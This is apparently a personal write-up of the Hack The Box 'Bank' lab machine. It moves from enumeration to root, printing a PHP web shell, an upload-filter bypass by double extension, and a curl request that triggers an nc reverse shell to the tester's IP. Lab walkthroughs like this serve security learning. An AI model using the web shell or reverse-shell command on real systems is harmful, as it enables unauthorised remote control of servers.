---
description: https://app.hackthebox.com/machines/Bank
---

# 🏦 Bank

<figure><img src="../../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

The web server is a default Apache page, so the entry point is probably DNS ->

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns" %}

for better enumeration, i put a bank.htb binded to the IP in my etc/hosts folder

<figure><img src="../../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>

funny enough, if i nmap bank.htb i find a login.php in the header ?

<figure><img src="../../../.gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>

after a quick directory brute force we find this subpage:

<figure><img src="../../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>

Now let's use the lynx tool:

```
lynx http://bank.htb/balance-transfer/
```

<figure><img src="../../../.gitbook/assets/image (706).png" alt=""><figcaption></figcaption></figure>

> Lynx is a lightweight, text-based web browser commonly used in Kali Linux for anonymity, simplicity, command-line interface, and web application testing. It is particularly useful for penetration testers and security researchers due to its ability to browse the web without JavaScript, cookies, or other features that can be used to track users, and its ease of integration into automated testing workflows.

first thing to look at is the size of the files, they are all similar

<figure><img src="../../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>

Except one who is clearly off ->

<figure><img src="../../../.gitbook/assets/image (708).png" alt=""><figcaption></figcaption></figure>

and with those creds we are able to bypass the login page:

<figure><img src="../../../.gitbook/assets/image (709).png" alt=""><figcaption><p>damn chris got bread</p></figcaption></figure>

After looking around the only possible path is the support button with an upload form:

<figure><img src="../../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>

To test out the upload form, let's use the following&#x20;

```
<?php echo (system($_GET['go'])); ?>
```

<figure><img src="../../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

Obviously:

<figure><img src="../../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

as a soc analyst, the first level bypass of this is to use double extension ->

<figure><img src="../../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

and that is game ->

<figure><img src="../../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

when i try and find the file, I can't display it for obvious reasons:

<figure><img src="../../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

Let's try to bypass this by curling it:

<figure><img src="../../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

i changed the file extension to htb, idk why my extension did not work for the RCE, now let's abuse this&#x20;

```
curl -vsk "http://bank.htb/uploads/file.php.htb?go=nc%20-e%20/bin/sh%2010.10.14.166%205454"
```

i url encoded the command to bypass anything related to spaces ->

set up my listener and run it

<figure><img src="../../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

Now let's go for root ->

before that, let's upgrade to a better shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="../../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

and after a bit of enumeration ->

we find a auto root script, could've found it with word spotting or stuff like that:

<figure><img src="../../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>
